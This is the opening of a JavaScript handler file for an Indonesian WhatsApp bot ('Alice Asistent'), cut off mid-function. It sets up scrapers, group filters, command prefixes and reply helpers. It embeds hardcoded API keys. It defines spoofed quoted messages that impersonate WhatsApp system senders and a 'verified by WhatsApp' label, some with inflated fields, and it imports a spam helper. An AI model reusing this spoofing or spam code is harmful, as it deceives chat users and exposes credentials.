//————————————————————————//

/*

Alice Asistent
© XyrooRynzz
2022 - 2026

Source
WhatsApp Me : 6281543496975
Tele me : t.me/XyrooRynzz
instagram : xyroorynzz
https://chat.whatsapp.com/IJx5bkPvivUCeai7d2ChRC
https://whatsapp.com/channel/0029VamvtL2ADTO7ikBeNe1E

*/

//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Modulenya bang
process.on('uncaughtException', console.error)
require('./AliceSet')
require('./AliceLibray/AliceMenu')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageContent, makeWASocket, generateWAMessage, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, PHONENUMBER_MCC, generateWAMessageFromContent, proto, prepareWAMessageMedia  } =require("@whiskeysockets/baileys")
//🌌——————————————————————————————————————————————————————————————————————————🌌\\——————————————————————————————————————————————————————————————————————————🌌\\
const os = require('os')
const fs = require('fs')
const ms = require("ms");
const dns = require('dns');
const path = require("path")
const util = require('util')
const https = require('https')
const chalk = require('chalk')
const ds = require('d-scrape')
const axios = require('axios')
const mark = `0@s.whatsapp.net`
const msx = require('parse-ms')
const fg = require('api-dylux')
const fsx = require('fs-extra')
const crypto = require('crypto')
const cron = require('node-cron')
const gtts = require('node-gtts')
const yts = require ('yt-search');
const cheerio = require('cheerio');
const nou = require("node-os-utils")
const FormData = require('form-data')
const genshindb = require("genshin-db")
const ffmpeg = require('fluent-ffmpeg');
const ffmpegStatic = require('ffmpeg-static');
const speed = require('performance-now')
const similarity = require('similarity');
const moment = require('moment-timezone')
const PhoneNum = require('awesome-phonenumber')
const { Primbon } = require('scrape-primbon')
const { GoogleGenerativeAI } = require ("@google/generative-ai");
const { spawn: spawn, exec, execSync } = require('child_process')
const primbon = new Primbon()
const threshold = 0.72

// mengambil semua database
global.db.data = JSON.parse(fs.readFileSync('./AliceDatabase/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}

const apii = {
  xterm: {
    url: "https://aihub.xtermai.xyz",
    key: "AIza9I0qCRa4kfAInKwS"
  }
};

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Fungsi Untuk Memanggil Code Yang Ada Di File js Terpisah
const { resize } = require('./AliceLibray/myfunction')
const { monospace, randomKarakter } = require('./AliceLibray/myfunc')
const { nglspam, Enc } = require('./AliceLibray/scrape')
const { uptotelegra } = require('./AliceLibray/upload')
const uploadImage = require('./AliceLibray/uploadImage')
const { capital, encryptCode } = require('./AliceLibray/functionn');
const { chatGpt } = require('./AliceLibray/screaper');
const { toRupiah } = require("./AliceLibray/func")
const { CatBox } = require('./AliceLibray/uploadcatbox')
const changelogs = global.db.data.changelog || []
const db_absen = JSON.parse(fs.readFileSync("./AliceSystem/AliceDatabase/Group/absen.json"));
const db_sider = JSON.parse(fs.readFileSync("./AliceSystem/AliceDatabase/Group/sider.json"));
const contacts = JSON.parse(fs.readFileSync("./AliceDatabase/contacts.json"));
const user_ban = JSON.parse(fs.readFileSync('./AliceDatabase/banned.json'))
let _cmd = JSON.parse(fs.readFileSync('./AliceDatabase/command.json'));
const afk = require('./AliceSystem/AliceDatabase/Afk/afk')
let _afk = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Afk/afk.json'))
let mute = JSON.parse(fs.readFileSync('./AliceDatabase/mute.json'));
const timestampp = speed();
const latensi = speed() - timestampp
let reminders = {};
const { smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, reSize, randomNumber } = require('./AliceLibray/myfunction')
const { savefromV2, ChatGpt, searchfilm, tafsir, instagram4, capcutdl, instagram2, instagram3, cekkuota, tele, ytPlayMp4, ytPlayMp3, textpro, kodepos, listsurah, ephoto, emoji} = require('./AliceLibray/scraper')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./AliceSystem/AliceDatabase/Group/list')
let db_respon_list = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Group/list-message.json'))
const { 
	addFilter, 
	addSpam, 
	isFiltered, 
	isSpam, 
	ResetSpam 
} = require('./AliceLibray/antispam');

const TypeMess = getContentType(m?.message);
let reactions = TypeMess == "reactionMessage" ? m?.message[TypeMess]?.text : false;

// Batas
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Scraper
const { Felo } = require('./AliceSystem/AliceScraper/Felo.js');
const { Capcut } = require('./AliceSystem/AliceScraper/capcut')
const { pxpic } = require('./AliceSystem/AliceScraper/pxpic.js')
const { PinDL } = require('./AliceSystem/AliceScraper/pindl.js')
const { fdown } = require('./AliceSystem/AliceScraper/facebook.js')
const { wattpad } = require("./AliceSystem/AliceScraper/wattpad.js")
const { SaveTube } = require('./AliceSystem/AliceScraper/SaveTube.js')
const { komikindo } = require("./AliceSystem/AliceScraper/komikindo.js")
const { muslimai } = require('./AliceSystem/AliceScraper/MuslimAI.js')
const { Telesticker } = require('./AliceSystem/AliceScraper/scrape-telesticker')
const { tiktok2, tiktoks } = require('./AliceSystem/AliceScraper/Tiktok.js')
const { xnxxDownloader, xnxxSearch } = require('./AliceSystem/AliceScraper/xnxx')
const { Ytdl, yt_search, ddownr } = require('./AliceSystem/AliceScraper/ytdl')
const { createQRIS, checkStatus } = require('./AliceSystem/AliceScraper/qris')
const { upScale, remini, Pxpic } = require('./AliceSystem/AliceScraper/enhance')
const { npmStalk, chstalk, igstalk } = require('./AliceSystem/AliceScraper/stalker')
const animexin = require('./AliceSystem/AliceScraper/animexin');
const convertToMorse = require('./AliceSystem/AliceScraper/Morse.js')
const PlayStore = require('./AliceSystem/AliceScraper/playstore.js')
const WikiMedia = require('./AliceSystem/AliceScraper/wikimedia.js')
const FFW = require('./AliceSystem/AliceScraper/FFW.js')
const Python = require('./AliceSystem/AliceScraper/Python.js')
const Html = require('./AliceSystem/AliceScraper/Html.js')
const BookSearch = require('./AliceSystem/AliceScraper/caribuku.js')
const LirikLagu = require('./AliceSystem/AliceScraper/lirik.js')
const Eai = require('./AliceSystem/AliceScraper/eai.js')
const Yimg = require('./AliceSystem/AliceScraper/yahooimg.js')
const txt2 = require('./AliceSystem/AliceScraper/txt-to-image.js')
const JavaScript = require('./AliceSystem/AliceScraper/Javascript.js')
// Batas
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
const {
    igdl: igdl,
    youtube: youtube,
    ttdl: ttdl
} = require("btch-downloader");
const {
  createQR,
  cekStatus,
  cancelTrx,
  cekPay,
  callBack,
} = require("./AliceLibray/paydisini");
const {
addPremiumUser,
getPremiumExpired,
getPremiumPosition,
expiredCheck,
checkPremiumUser,
getAllPremiumUser,
} = require('./AliceLibray/premiun')
const {
  CNNNews,
  CNBCNews,
  DetikNews,
  KontanNews,
  iNews,
  Quotes,
  Couples,
  Darkjokes,
  DailyNews
} = require("dhn-api")
const {
  uploadFileToApi: uploadFileToApi,
  WidipeCdn: WidipeCdn,
  ShannzCdn: ShannzCdn,
  YudzCdn: YudzCdn
} = require('./AliceLibray/UploaderCdn.js')
const sendReaction = async reactionContent => {
  Alice.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};


const api = {
  xterm: {
    url: "https://aihub.xtermai.xyz",
    key: "AIzaeAWCPw44TGUASdDR"
  }
}
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//Database game

const tebakgambar = {}
const tebakgame = {}
const tebakhero = {}
const tebakff = {}
const tebakjkt48 = {}
const tebakhewan = {}
const tebakml = {}
const tebakchara = {}
const tebaklogo = {}
const tebakaplikasi = {}
const tebakkata = {}
const asahotak = {}
const lengkapikalimat = {}
const tebakbendera = {}
const siapaaku = {}
const tebakkalimat = {}
const caklontong = {}
const susunkata = {}
const tekateki = {}
const tebakkimia = {}
const tebaklirik = {}
const tebaktebakan = {}
const mathgame = {}
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
module.exports = Alice = async (Alice, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.msg.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
//🌌
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};

const pushname = m.pushName || "No Name"
    
function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// ANTILINK Group
const ntilinkgc = JSON.parse(fs.readFileSync("./AliceSystem/AliceDatabase/Antilink/antilinkgc.json"))
let ntvirtex = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antivirus.json'))
let nttoxic = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antitoxic.json'))
let ntasing = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antiasing.json'))
let ntwame = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antiwame.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkytvideo.json'))
let ntilinktele =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktelegram.json'))
let ntilinkdewasa =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkbokep.json'))
let ntilinkterabox =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkterabox.json'))
let ntilinkmediafire =JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkmediafire.json'))
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Anti In Group
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
const AntiLink = m.isGroup ? ntilinkgc.includes(m.chat) : false 
const AntiVirtex = m.isGroup ? ntvirtex.includes(m.chat) : false
const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(m.chat) : false
const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(m.chat) : false
const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(m.chat) : false
const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(m.chat) : false
const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(m.chat) : false
const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(m.chat) : false
const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(m.chat) : false
const AntiLinkAll = m.isGroup ? ntilinkall.includes(m.chat) : false
const AntiWame = m.isGroup ? ntwame.includes(m.chat) : false
const AntiToxic = m.isGroup ? nttoxic.includes(m.chat) : false
const AntiAsing = m.isGroup ? ntasing.includes(m.chat) : false
const AntiDewasa = m.isGroup ? ntilinkdewasa.includes(m.chat) : false
const AntiTerabox = m.isGroup ? ntilinkterabox.includes(m.chat) : false
const AntiMediafire = m.isGroup ? ntilinkmediafire.includes(m.chat) : false
const AntiTele = m.isGroup ? ntilinktele.includes(m.chat) : false
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// SET OWNER,PREM,DLL DISINI!!!
//————————————————————————//
const senderr = m.key.fromMe
? Alice.user.id.split(":")[0] || Alice.user.id
: m.key.participant || m.key.remoteJid;
const senderNumber = senderr.split('@')[0];
const botNumber = await Alice.decodeJid(Alice.user.id) // Bot number
const owner = JSON.parse(fs.readFileSync('./AliceDatabase/owner.json')) //Owner
const premium = JSON.parse(fs.readFileSync('./AliceDatabase/premium.json')) //Prem
const args = body.trim().split(/ +/).slice(1)
const isOwner = [botNumber, ...owner, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) //Set text owner
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// SET PREFIX BISA DI ATUR DISINI JUGA
//————————————————————————//
const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
		if (Object.keys(db.data.settings).includes(botNumber) && Object.keys(db.data.settings[botNumber]).includes("setPrefix") && db.data.settings[botNumber].setPrefix == "one") {
			var thePrefix = "𝐌𝐔𝐋𝐓𝐈"
			var prefix = body.startsWith("#") ? "#" : body.startsWith("!") ? "!" : body.startsWith("/") ? "/" : body.startsWith("?") ? "?" : "."
			var isCmd = body.startsWith(prefix)
			var command = isCmd ? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase() : ""
		} else if (Object.keys(db.data.settings).includes(botNumber) && Object.keys(db.data.settings[botNumber]).includes("setPrefix") && db.data.settings[botNumber].setPrefix == "no") {
			var thePrefix = "𝐍𝐎"
			var prefix = ""
			var isCmd = body.startsWith(prefix)
			var command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase()
		} else if (Object.keys(db.data.settings).includes(botNumber) && Object.keys(db.data.settings[botNumber]).includes("setPrefix") && db.data.settings[botNumber].setPrefix == "all") {
			var thePrefix = "𝐀𝐋𝐋"
			var prefix = body.startsWith("#") ? "#" : body.startsWith("!") ? "!" : body.startsWith("/") ? "/" : body.startsWith("?") ? "?" : "."
			var isCmd = body.startsWith(prefix)
			var command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase()
		} else {
			var thePrefix = "𝐌𝐔𝐋𝐓𝐈"
			var prefix = body.startsWith("#") ? "#" : body.startsWith("!") ? "!" : body.startsWith("/") ? "/" : body.startsWith("?") ? "?" : "."
			var isCmd = body.startsWith(prefix)
			var command = isCmd ? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase() : ""
		}
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
const text = q = args.join(" ")
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const isImage = /image/.test(mime);
const isVideo = /video/.test(mime);
const isSticker = /sticker/.test(mime);
const isAudio = /audio/.test(mime);
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await Alice.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isMute= mute.includes(m.chat) ? true : false
const isAfkOn = afk.checkAfkUser(m.sender, _afk)
const isXMEDIA = m.mtype
const isBot = botNumber.includes(senderNumber)
const isPrivate = !m.key.remoteJid.includes('@g.us');
const qmsg = (quoted.msg || quoted)
const more = String.fromCharCode(8206)
const isPc = from.endsWith('@s.whatsapp.net')
const isBan = user_ban.includes(m.sender)
const readmore = more.repeat(4001)
const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])] 
const isPrem = isOwner || isOwner || checkPremiumUser(m.sender, premium);
const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"

const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  

if(time2 < "00:00:00"){
var stime = Styles(`Selamat Tengah Malam 👋🏻`)
 }
 if(time2 < "19:00:00"){
var stime = Styles(`Selamat Malam 👋🏻`)
 }
 if(time2 < "16:00:00"){
var stime = Styles(`Selamat Sore 👋🏻`)
 }
 if(time2 < "11:00:00"){
var stime = Styles(`Selamat Siang 👋🏻`)
 }
 if(time2 < "06:00:00"){
var stime = Styles(`Selamat Pagi 👋🏻`)
 }
 
const timee = moment().tz('Asia/Jakarta').format("HH:mm:ss");
const timestamp = moment().tz("Asia/Jakarta").valueOf();
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const tanggal2 = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')	

// Warn
const warnPath = path.join(__dirname, 'AliceDatabase', 'warn.json');
if (!fs.existsSync(warnPath)) fs.writeFileSync(warnPath, JSON.stringify({}));

const warnData = JSON.parse(fs.readFileSync(warnPath, 'utf-8'));

function saveWarnData() {
  fs.writeFileSync(warnPath, JSON.stringify(warnData, null, 2));
}

const XyrooRynzz = prefix+command
const Xyroo = prefix
const Rynzz = command
//————————————————————————////————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Fake Quoted
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Getpp user
const cap = 'Alice'
try {
pplu = await Alice.profilePictureUrl(anu.id, 'image')
} catch {
pplu = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

const x = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                "contactMessage": {
                    'displayName': `$${ownername}`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN: ${botname} v3.0\nitem1.TEL;waid=${m.sender.split("@")[0]}:+${m.sender.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': pplu,
                    thumbnail: pplu,
                    sendEphemeral: true
                }   
            }
        }
        
// Fake Quoted        
const xy = {
    key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
    },
    message: {
        orderMessage: {
            itemCount: 99999,
            status: 200,
            thumbnailUrl: thumb,
            surface: 200,
            message: `${packname}`,
            orderTitle: '@ciro',
            sellerJid: '0@s.whatsapp.net'
        }
    },
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true
    },
    sendEphemeral: true
};

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${ownername}`,jpegThumbnail: ""}}}

    const p ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 9999,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}

		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=6281328139682:6281328139682\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}

    const al = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": '${ownername}',"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./AliceMedia/image/Alice.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}	

	const ftroli = { key:{ remoteJid: 'status@broadcast', participant: '0@s.whatsapp.net' }, message:{ newsletterAdminInviteMessage: { newsletterJid: 'nd@newsletter', newsletterName: 'Information', caption: `© ${ownername} | 2025`, inviteExpiration: 0}}}	

const xyyy = {
key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `${ownername}`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "IDR", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: `${botname}`}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "INR"}}}}

const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `_${botname} Terverifikasi Oleh WhatsApp_`,thumbnailUrl: thumb}}}

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Set Menu Reply Disini
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Reply Footer
const nwreply = (anu) => {
const {message, key} = generateWAMessageFromContent(m.chat, {
  interactiveMessage: {
    body: {text: anu},
    footer: {text: `${packname}`},
    nativeFlowMessage: {
      buttons: [{text: "2025"}
           ],
    }
  },
}, {quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `${XyrooRynzz}`}}})
 Alice.relayMessage(m.chat, {viewOnceMessage:{message}}, {messageId:key.id})
}

async function ReplyRynzz(teks) {
      const nedd = {      
        contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: botname,
		newsletterJid: idch,
		},
		externalAdReply: {  
            showAdAttribution: true,
            title: `${hariini}`,
            body: `${packname}`,
            previewType: "IMAGE",
            thumbnailUrl: thumb,
            sourceUrl: wame, 
          },
        },
        text: teks,
      };
      return Alice.sendMessage(m.chat, nedd, {
        quoted: m,
      });
    }
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// reply x listmenu
async function xreplyy(peler) {
Alice.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
fileName: `${botname}`,
mimetype: "application/pdf",
fileLength: 1,
caption: peler,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: `${botname}`,
newsletterJid: '',
},
externalAdReply: {  
title: `${packname}`, 
body: `${hariini} `,
thumbnailUrl: thumb,
sourceUrl: xtele, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})}
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Reply Menu
async function xreplyx(chat, teks, listnye, xy) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: idch,
newsletterName: `${botname} —`,
serverMessageId: 145
},
businessMessageForwardInfo: {
businessOwnerJid: Alice.decodeJid(Alice.user.id)
},
externalAdReply: {
title: `${botname} ${version}`,
body: `${packname}`,
thumbnailUrl: thumb,
sourceUrl: ig,
mediaType: 1,
renderLargerThumbnail: true
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© ${ownername} | 2025`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: ``,
thumbnailUrl: "",
gifPlayback: true,
subtitle: "",
hasMediaAttachment: true,
...(await prepareWAMessageMedia({
document: fs.readFileSync('./AliceMedia/image/Alice.png'),
mimetype: "image/png",
fileLength: 99999999999999,
jpegThumbnail: fs.readFileSync('./AliceMedia/image/Alice.png'),
fileName: `${botname}`,
}, {
upload: Alice.waUploadToServer
}))
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listnye)
}],
}), })}
}}, {quoted: m})
 await Alice.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
} 
//---------------------------------------------------------------\\
Alice.sendStatusMention = async (content, jids = []) => {
let users;
for (let id of jids) {
let userId = await Alice.groupMetadata(id)
users = await userId.participants.map(u => Alice.decodeJid(u.id))
}
let message = await Alice.sendMessage(
"status@broadcast", content, {
backgroundColor: "F54242",
font: Math.floor(Math.random() * 9),
statusJidList: users,
additionalNodes: [
{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {},
content: jids.map((jid) => ({ tag: "to", attrs: { jid }, content: undefined, })),
}, ], }, ], })
jids.forEach(id => {
Alice.relayMessage(id, {
groupStatusMentionMessage: {
message: {
protocolMessage: {
key: message.key,
type: 25,
}, }, }, },
{ userJid: Alice.user.jid, additionalNodes: [{
tag: "meta", attrs: { is_status_mention: "true" }, content: undefined, }, ], })
delay(2500)
})
return message
} 
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//━━━━━━━━━━━━━━━━━━━━━//
// MESSAGE AREA

//onlyOwner

const Xowner = async() =>{
  let toks = Styles(`Kamu Bukan Owner ku !!`)
    let contextInfo = {
      forwardingScore: 999,
        isForwarded: true,
         mentionedJid: [m.sender],
          forwardedNewsletterMessageInfo: {
          newsletterJid: global.idch,
          serverMessageId: 100,
          newsletterName: botname
          },
    externalAdReply: {
    showAdAttribution: true,
      title: '❌ Command Kamu Dibatasi !!',
      body: hariini,
      previewType:"PHOTO",
      thumbnailUrl: thumb,
      sourceUrl: ig, 
    }
    }

    Alice.sendMessage(from, { contextInfo, text: `${toks}`}, { quoted: m })
    }
    
  //onlyAdmin
  const Xadmin = async() =>{
  let toks = Styles(`Command Hanya Untuk Admin Group`)
      let contextInfo = {
        forwardingScore: 999,
          isForwarded: true,
           mentionedJid: [m.sender],
            forwardedNewsletterMessageInfo: {
